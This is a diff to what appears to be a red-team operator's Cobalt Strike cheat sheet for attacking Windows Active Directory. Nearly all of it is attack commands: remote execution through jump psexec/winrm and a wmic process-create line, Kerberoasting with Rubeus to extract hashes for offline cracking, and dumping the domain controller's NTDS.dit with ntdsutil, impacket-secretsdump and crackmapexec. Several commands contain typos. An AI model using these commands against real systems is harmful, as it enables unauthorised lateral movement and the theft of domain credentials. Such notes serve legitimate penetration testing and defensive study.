@@ -127,16 +127,10 @@ Cobalt
 
 Lateral Movement
   make_token username password
-  shell dir \\system\c$ (Check if admin)
-  shell net use \\system\c$
-  wmi system listener (tab complete listener) 
-    OR powershell_psh
-  spawn x64 listener (New listerner that is not Powershell)
-  unlink ip addr of attack system (from target; can tab complete)
-  link ip addr of target system (from attack box; verify dual home IP addresses)
-  exit original beacon
-  verify no powershell is running
-  
+    ls \\target\c$ (verify permissions)
+  jump psexec, psexec64, psexec_psh, winrm, winrm64
+  shell wmic.exe /node:<target> process call create "powershelle.exe whoami"
+   
 PrivEsc
   Kerberoast (Request SPN and get the TGS for offline cracking)
     Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
@@ -154,6 +148,7 @@ PrivEsc
   Dump DC NTDS.dit
     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
     /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
+    crackmapexec can dump NTDS.dit
     
   Printer Bug (Get DC TGT from Unconstrained Delegation machine)
       Rubeus monitor /interval:1 (monitors for TGT when spoolsample is run)
